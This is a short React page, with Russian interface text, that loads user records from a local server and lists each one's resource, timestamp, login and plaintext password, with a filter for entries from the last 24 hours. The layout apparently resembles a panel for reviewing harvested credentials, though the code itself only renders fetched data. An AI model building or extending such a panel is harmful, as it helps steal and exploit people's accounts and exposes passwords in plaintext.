import React from 'react'
import { useState } from 'react'

const AllUsersPage = () => {
    const [users, setUsers] = useState([]);
    const [error, setError] = useState("");
  
    const fetchUsers = (url) => {
        fetch(url)
          .then(async (response) => {
            if (!response.ok) {
              throw new Error("Ошибка загрузки пользователей");
            }
            return response.json();
          })
          .then((data) => {
            setUsers(data);
            setError("");
          })
          .catch((err) => {
            console.error("Ошибка:", err);
            setError("Не удалось загрузить пользователей");
          });
      };
  
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-5">
        <h1 className="text-2xl font-bold mb-4">Список пользователей</h1>
        <div className="flex gap-4 mb-4">
        <button
          onClick={() => fetchUsers("http://localhost:8000/getUsers")}
          className="px-4 py-2 bg-blue-500 text-white rounded-md"
        >
          Загрузить всех пользователей
        </button>

        <button
          onClick={() => fetchUsers("http://localhost:8000/getRecentUsers")}
          className="px-4 py-2 bg-green-500 text-white rounded-md"
        >
          Загрузить новых (24ч)
        </button>
      </div>
  
        {error && <p className="text-red-500">{error}</p>}
  
        <div className="w-full max-w-md space-y-4">
          {users.length > 0 ? (
            users.map((user, index) => (
              <div key={index} className="p-4 border rounded-md shadow-md bg-white">
                <p className="font-semibold">Ресурс: {user.resource}</p>
                <p className="text-gray-600">Когда: {user.time}</p>
                <p className="text-gray-600">Логин: {user.login}</p>
                <p className="text-gray-600">Пароль: {user.password}</p>
              </div>
            ))
          ) : (
            <p className="text-gray-500">Нет данных</p>
          )}
        </div>
      </div>
    );
}

export default AllUsersPage